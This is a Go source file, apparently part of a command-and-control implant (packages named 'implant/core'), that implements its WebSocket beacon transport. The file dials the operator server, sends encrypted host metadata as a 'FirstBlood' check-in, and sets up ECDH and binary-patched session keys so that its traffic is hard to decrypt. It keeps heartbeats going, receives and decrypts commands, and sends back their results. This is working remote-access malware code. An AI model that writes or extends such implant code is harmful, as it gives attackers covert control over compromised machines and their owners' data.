//go:build transport_websocket || transport_multi

package main

import (
	"fmt"
	"implant/core/app"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/debuglog"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// NewTransport 构造 websocket 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("websocket", newWebSocketTransport)
	listenerType = "websocket"
}

func newWebSocketTransport() transportClient {
	return &WSClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (c *WSClient) IsConnected() bool { return c.connected }

// ReconnectMgr 返回重连管理器
func (c *WSClient) ReconnectMgr() *reconnect.ReconnectManager { return c.reconnectMgr }

// WSClient 基于 gorilla/websocket 直连实现（替代 togettoyou/wsc）：
// 原 wsc 库断线时内部自动 go Connect() 重连，与 runLoop 的手动重连并行 →
// 同一时刻建立多条 WS 连接、重复 FirstBlood → 服务端重复发上线事件、
// 旧连接被覆盖关闭 → 客户端被误判离线/反复上线振荡。
// 本实现与 TCP transport 同架构：Connect 内完成 FirstBlood/密钥/心跳，
// Recv 同步读（RecvDeadline 兜底），重连完全由 runLoop 统一管理。
type WSClient struct {
	Client       *websocket.Conn
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	stopCh       chan struct{}
	sendMutex    sync.Mutex // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
	connectStart time.Time
}

func (c *WSClient) fail() {
	c.connected = false
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectFailed()
	}
}

// Connect 建立 WebSocket、FirstBlood、会话密钥、启动心跳。
func (c *WSClient) Connect(url string) error {
	c.connectStart = time.Now()
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectAttempt()
	}

	// config.Host 由服务端 patch 为 "host:port"（无 scheme）—— 补齐 ws:// 与 /ws 路径
	if !strings.HasPrefix(url, "ws://") && !strings.HasPrefix(url, "wss://") {
		url = "ws://" + url
	}
	if !strings.Contains(strings.TrimPrefix(strings.TrimPrefix(url, "ws://"), "wss://"), "/") {
		url += config.WSPath()
	}

	dialer := websocket.Dialer{
		HandshakeTimeout: 30 * time.Second,
	}
	// 会话前 ECDH 交换（阶段一 1c）：升级请求带客户端公钥，升级响应回服务端公钥。
	// 必须在生成 MetaInfo **之前** —— MetaInfo 是升级后的第一帧，
	// 若先加密再交换，那一帧仍会被静态密钥解开，改造只剩表面效果。
	hdr := http.Header{"User-Agent": []string{config.UserAgent()}}
	kx, kxErr := encrypt.NewKeyExchange()
	if kxErr == nil {
		hdr.Set(encrypt.KxHeaderName, kx.HeaderValue())
	}
	conn, resp, err := dialer.Dial(url, hdr)
	if err != nil {
		c.fail()
		return err
	}
	// 读消息大小上限（与服务端 SetReadLimit(64MB) 对齐）
	conn.SetReadLimit(64 * 1024 * 1024)
	c.Client = conn
	c.connected = true

	// 升级响应里带回服务端公钥 → 派生并替换静态主密钥。
	// 失败一律静默继续（走静态密钥），与"服务端不支持 ECDH"表现一致。
	if kxErr == nil && resp != nil {
		if peerPub, perr := encrypt.ParsePeerPublicKey(resp.Header.Get(encrypt.KxHeaderName)); perr == nil {
			salt, _ := app.GetListenerKeyConfig(listenerType)
			if masterKey, derr := kx.DeriveMasterKey(peerPub, salt[:16]); derr == nil {
				if rerr := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); rerr == nil {
					utils.MetaInfo = nil // 旧 MetaInfo 由静态密钥生成，必须重建
					debuglog.Printf("🔑 [WS-KX] 会话前密钥交换完成，已替换静态主密钥\n")
				}
			}
		}
	}

	// MetaInfo + FirstBlood
	if len(utils.MetaInfo) == 0 {
		utils.MetaInfo, _ = utils.EncryptedMetaInfo()
		utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
	}
	if err := c.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
		c.fail()
		return err
	}

	// 会话密钥（占位符由服务端二进制 patch 替换）
	salt, masterKey := app.GetListenerKeyConfig(listenerType)
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
		c.fail()
		return err
	}
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectSuccess()
	}

	// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积
	c.StartHeartbeat()

	debuglog.Printf("✅ [WebSocket] 连接成功，延时: %v\n", time.Since(c.connectStart))
	return nil
}

// StartHeartbeat 启动/重启心跳 goroutine（重连时先停旧的）
func (c *WSClient) StartHeartbeat() {
	if c.stopCh != nil {
		close(c.stopCh)
	}
	c.stopCh = make(chan struct{})
	stop := c.stopCh
	go app.HeartbeatLoop(stop, c.keepAlive)
}

// Recv 读取一条命令（WebSocket 二进制消息），解密后返回（cmdType|cmdBuf）。
// 读超时：服务端每心跳回复 ack，健康连接不会超时；超时说明服务端半开/死亡，触发重连。
func (c *WSClient) Recv() ([]byte, error) {
	if c.Client == nil || !c.connected {
		c.fail()
		return nil, fmt.Errorf("未连接")
	}
	// 读 deadline：与服务端心跳 ack 节奏匹配，黑洞网络下快速重连而非永久卡死
	if err := c.Client.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
		c.fail()
		return nil, err
	}
	_, payload, err := c.Client.ReadMessage()
	if err != nil {
		c.fail()
		return nil, err
	}

	rawData, err := encrypt.DecodeBase64(payload)
	if err != nil {
		return nil, err
	}
	decrypted, err := communication.DecryptCommand(rawData)
	if err != nil {
		return nil, err
	}
	// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4），重派生会话密钥
	if decrypted, err = communication.ConsumeSessionNonce(decrypted); err != nil {
		return nil, err
	}
	if decrypted == nil {
		return nil, nil
	}
	// 心跳 ack（type=3 空载荷）：仅存活探测，非命令，丢弃
	if communication.IsHeartbeatAck(decrypted) {
		return nil, nil
	}
	return decrypted, nil
}

// SendResult 按 WebSocket 分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet
func (c *WSClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return c.rawSend(msgToSend)
}

// rawSend 发送二进制消息。全写路径串行化（心跳/结果/FirstBlood 互斥，防帧交错）。
func (c *WSClient) rawSend(msg []byte) error {
	c.sendMutex.Lock()
	defer c.sendMutex.Unlock()
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[SEND-PANIC] %v\n", r)
		}
	}()
	if c.Client == nil {
		return fmt.Errorf("连接为空")
	}
	return c.Client.WriteMessage(websocket.BinaryMessage, msg)
}

func (c *WSClient) keepAlive() {
	c.rawSend(communication.HeartbeatMsg())
}

func (c *WSClient) Close() error {
	if c.stopCh != nil {
		close(c.stopCh)
		c.stopCh = nil
	}
	if c.Client != nil {
		err := c.Client.Close()
		c.Client = nil
		return err
	}
	return nil
}
